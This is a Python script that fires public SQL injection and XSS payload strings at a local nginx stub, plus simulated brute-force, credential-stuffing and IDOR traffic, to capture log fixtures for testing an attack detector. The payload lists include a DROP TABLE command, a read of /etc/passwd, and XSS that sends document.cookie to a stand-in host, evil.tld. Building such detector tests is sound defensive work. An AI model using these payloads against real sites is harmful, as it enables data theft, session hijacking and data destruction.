"""Capture real web-attack fixtures by firing payloads through a live nginx and freezing its log.

**Why this exists next to ``generate_sample_logs.py``.** That script synthesises log lines; this
one captures them. A payload detector's whole question is whether it generalises past the encodings
its author imagined, and a hand-written fixture can only contain encodings the author thought of.
Firing genuine attack strings through a real HTTP round-trip and a real nginx makes the parser and
the matcher meet the URL-encoding, the byte counts, and the request-line handling a real server
produces -- which is exactly what a synthetic fixture cannot supply. The payloads themselves are
public, well-known strings from injection cheat sheets and WAF-test corpora.

**Why not sqlmap / nikto.** Windows Defender quarantines them as ``HackTool:Python/Sqlmap`` on
sight (real-time protection on this machine, verified 2026-09-07). The client here is stdlib
``urllib`` so nothing is flagged, and the realism that matters for a *payload* detector -- the
encoding and the server-side logging -- is unchanged. Only the delivery agent differs.

**The nginx sink.** Any nginx that logs ``combined`` format works. The one used to capture the
committed fixtures listened on 8080 with the production ``log_format`` and these stub endpoints,
so a scanner gets a real status code rather than a bare 404 that makes some tools bail::

    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
    server {
        listen 8080;
        location = /rest/products/search { return 200 '{"ok":true}'; }
        location = /rest/search          { return 200 '{"ok":true}'; }
        location /api/                    { return 200 '{"ok":true}'; }
        location = /login                { return 401 '{"error":"bad creds"}'; }
        location /                        { try_files $uri =404; }
    }

**Usage**::

    python scripts/capture_web_attack_corpus.py --nginx-log C:/tmp/talos_nginx/logs/access.log

The captured fixtures are frozen and committed, so a re-run is only needed when the payload set
changes. The loopback source address a local capture records is rewritten to the documentation
range (RFC 5737) per scenario, since one host cannot originate from many addresses -- everything
else is exactly what nginx wrote.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Callable, Sequence
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = REPO_ROOT / "tests" / "fixtures" / "logs"

# Real SQL injection payloads: tautology (incl. the parenthesised bypass), union, error-based,
# stacked, blind, and the comment-obfuscated / case-varied evasions a matcher must handle. The
# subquery and hex-tautology forms near the end are deliberately borderline: they route to the
# model tier, and the offline measurement counts them as static-path misses honestly.
SQLI: tuple[str, ...] = (
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "admin' --",
    "admin'#",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1 UNION SELECT username,password FROM users--",
    "1 UNION SELECT null,version()--",
    "-1 UNION SELECT 1,2,3,4,5--",
    "1 UNION/**/SELECT/**/null,table_name/**/FROM/**/information_schema.tables",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' OR '1'='1' LIMIT 1--",
    "1'; DROP TABLE users--",
    "1'; INSERT INTO users VALUES('h','x')--",
    "name LIKE '%a%' OR 1=1",
    "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)--",
    "1' OR SLEEP(5) OR '",
    "1'||(SELECT '')||'",
    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "0x31 OR 0x31=0x31",
    "1' OR 'x'='x",
    "1) OR (1=1",
    "1' GROUP BY CONCAT_WS(0x3a,version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
    "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
    "1 AND 1=1",
    "1 AND 1=2",
    "cat' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1' oR '1'='1",
    "1' UnIoN sElEcT 1,2--",
    "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2--",
    "1' OR 1=1 INTO OUTFILE '/tmp/x'--",
)

# Real XSS payloads: script tags, event handlers, svg/img vectors, javascript: URIs, attribute
# breakout, a double-encoded evasion, case variation, and a couple of polyglots.
XSS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>x</a>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=prompt(1)>',
    "</script><script>alert(1)</script>",
    "<script src=//evil.tld/x.js></script>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<div onmouseover=alert(1)>x</div>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%2527%253E%253Cscript%253Ealert(1)%253C/script%253E",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=`x` onerror=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "<script>fetch('//evil.tld/'+document.cookie)</script>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
    "<img src=1 href=1 onerror=javascript:alert(1)>",
    "<style>@import'javascript:alert(1)';</style>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<x onclick=alert(1)>click",
)

# Benign lookalikes: content that trips a lazy rule and must NOT fire. The tricky ones from the
# P4 precision test, plus ordinary search traffic.
BENIGN: tuple[str, ...] = (
    "O'Brien",
    "select a plan that fits",
    "union square hotel new york",
    "<b>bold</b> text formatting",
    "the word onerror appears in this bug report",
    "5 > 3 and 2 < 4",
    "well-designed user-friendly interface",
    "data:image/png;base64,iVBORw0KGgo",
    "SELECT the best option from the menu",
    "drop off location for the package",
    "how to alert the team about an update",
    "javascript tutorial for beginners",
    "script writing for short films",
    "order by relevance please",
    "insert your name here",
    "delete my account settings",
    "where is the nearest cafe",
    "table for two at 7pm",
    "1=1 is a true statement in math",
    "c++ or python for data science",
    "screenshots and images gallery",
    "my email is jane@example.com",
    "price range $50 to $100",
    "waiting for the union meeting",
    "concatenate two strings in code",
)

# One attacker source per scenario; benign spread across a few clients. TEST-NET (RFC 5737),
# matching the range the hand-built fixtures already use.
SQLI_SRC = "203.0.113.50"
XSS_SRC = "203.0.113.70"
BENIGN_SRCS = ("198.51.100.20", "198.51.100.21", "198.51.100.22", "198.51.100.23", "198.51.100.24")


def _fire(base: str, path: str, payloads: Sequence[str], pause: float) -> None:
    """GET each payload as ``?q=<payload>``; a 4xx/5xx is fine, nginx logged the line regardless."""
    for payload in payloads:
        url = f"{base}{path}?{urllib.parse.urlencode({'q': payload})}"
        try:
            urllib.request.urlopen(url, timeout=5).read()
        except urllib.error.HTTPError:
            pass
        except OSError as exc:
            print(f"  transport error on {payload[:30]!r}: {exc}", file=sys.stderr)
        time.sleep(pause)


def _capture(log: Path, before: int) -> list[str]:
    """The log lines this run appended -- everything past the line count taken before firing."""
    lines = log.read_text(encoding="utf-8", errors="replace").splitlines()
    return [line for line in lines[before:] if line.strip()]


def _freeze(lines: list[str], dest: Path, source_for: Callable[[int], str]) -> int:
    """Rewrite the loopback source to a documented address and write the fixture."""
    out = [line.replace("127.0.0.1", source_for(i), 1) for i, line in enumerate(lines)]
    dest.write_text("\n".join(out) + "\n", encoding="utf-8")
    return len(out)


def _line_count(log: Path) -> int:
    if not log.exists():
        return 0
    return len(log.read_text(encoding="utf-8", errors="replace").splitlines())


# --- windowed detectors: brute force, credential stuffing, IDOR ------------------------------
#
# These are scored on rate and structure, not payload, so the value of a real round-trip is the
# authentic timing and format rather than the request contents. The username rides the query
# string because a combined log carries no body; a trailing ``ok=1`` is the one attempt the sink
# answers 302, which is how a burst records a success. The IDOR account is stamped into the
# ``remote_user`` field at freeze time, the same way the source address is -- a local capture
# cannot supply either.

WINDOWED_SRC = {"brute": "203.0.113.60", "stuffing": "203.0.113.61", "idor": "203.0.113.62"}
BENIGN_WIN_SRC = {"auth": "198.51.100.30", "access": "198.51.100.31"}


def _get(base: str, path: str, params: dict[str, str], pause: float) -> None:
    query = f"?{urllib.parse.urlencode(params)}" if params else ""
    try:
        urllib.request.urlopen(f"{base}{path}{query}", timeout=5).read()
    except urllib.error.HTTPError:
        pass
    except OSError as exc:
        print(f"  transport error on {path}: {exc}", file=sys.stderr)
    time.sleep(pause)


def _brute_force(base: str, pause: float) -> None:
    for _ in range(15):  # one account, one source, a sustained failed-password burst
        _get(base, "/login", {"username": "alice"}, pause)
    _get(base, "/login", {"username": "alice", "ok": "1"}, pause)  # the burst then succeeds


def _stuffing(base: str, pause: float) -> None:
    for i in range(20):  # breadth across accounts, one source -- the stuffing signature
        for _ in range(2):
            _get(base, "/login", {"username": f"user{i:03d}"}, pause)
    _get(base, "/login", {"username": "user007", "ok": "1"}, pause)  # one credential lands


def _idor(base: str, pause: float) -> None:
    # phase 1: read one's own orders to mature the baseline -- a cold-start account stays silent
    own = list(range(1000, 1020))
    for _ in range(2):
        random.Random(42).shuffle(own)
        for oid in own:
            _get(base, f"/api/orders/{oid}", {}, pause)
    # phase 2: enumerate outside the learned range -- the deviation the detector catches
    for oid in range(8001, 8013):
        _get(base, f"/api/orders/{oid}", {}, pause)


def _benign_auth(base: str, pause: float) -> None:
    for user in ("bob", "carol", "dave"):  # a mistype then a success -- ordinary, must stay silent
        _get(base, "/login", {"username": user}, pause)
        _get(base, "/login", {"username": user, "ok": "1"}, pause)


def _benign_access(base: str, pause: float) -> None:
    for oid in (8001, 8007, 8003, 8001, 8009):  # own records, not a sequential walk
        _get(base, f"/api/orders/{oid}", {}, pause)


def _stamp(lines: list[str], source: str, user: str) -> list[str]:
    """Rewrite the loopback source and the ``remote_user`` field of a captured combined line."""
    out = []
    for line in lines:
        parts = line.split(" ", 3)
        parts[0], parts[2] = source, user
        out.append(" ".join(parts))
    return out


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default="http://127.0.0.1:8080", help="nginx sink base URL")
    parser.add_argument("--nginx-log", type=Path, required=True, help="path to the sink access.log")
    parser.add_argument("--out", type=Path, default=FIXTURES, help="fixture output directory")
    parser.add_argument("--pause", type=float, default=0.02, help="seconds between requests")
    args = parser.parse_args(argv)

    batches = (
        (
            "sqli",
            "/rest/products/search",
            SQLI,
            "web_sql_injection_captured_access.log",
            lambda _i: SQLI_SRC,
        ),
        ("xss", "/rest/search", XSS, "web_xss_captured_access.log", lambda _i: XSS_SRC),
        (
            "benign",
            "/rest/products/search",
            BENIGN,
            "web_benign_captured_access.log",
            lambda i: BENIGN_SRCS[i % len(BENIGN_SRCS)],
        ),
    )
    for name, path, payloads, fixture, source_for in batches:
        before = _line_count(args.nginx_log)
        _fire(args.base, path, payloads, args.pause)
        captured = _capture(args.nginx_log, before)
        if len(captured) != len(payloads):
            print(
                f"  warning: fired {len(payloads)} but captured {len(captured)} -- "
                "is the nginx sink running and logging combined format?",
                file=sys.stderr,
            )
        written = _freeze(captured, args.out / fixture, source_for)
        print(f"{name}: {written} lines -> {fixture}")

    # Windowed scenarios, spaced so their timestamps span seconds the way a real burst does.
    windowed = (
        ("brute", _brute_force, "web_brute_force_captured_access.log", WINDOWED_SRC["brute"], "-"),
        (
            "stuffing",
            _stuffing,
            "web_credential_stuffing_captured_access.log",
            WINDOWED_SRC["stuffing"],
            "-",
        ),
        ("idor", _idor, "web_idor_captured_access.log", WINDOWED_SRC["idor"], "mallory"),
        (
            "benign-auth",
            _benign_auth,
            "web_benign_auth_captured_access.log",
            BENIGN_WIN_SRC["auth"],
            "-",
        ),
        (
            "benign-access",
            _benign_access,
            "web_benign_access_captured_access.log",
            BENIGN_WIN_SRC["access"],
            "carol",
        ),
    )
    for name, scenario, fixture, source, user in windowed:
        before = _line_count(args.nginx_log)
        scenario(args.base, max(args.pause, 0.15))
        captured = _stamp(_capture(args.nginx_log, before), source, user)
        (args.out / fixture).write_text("\n".join(captured) + "\n", encoding="utf-8")
        print(f"{name}: {len(captured)} lines -> {fixture}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
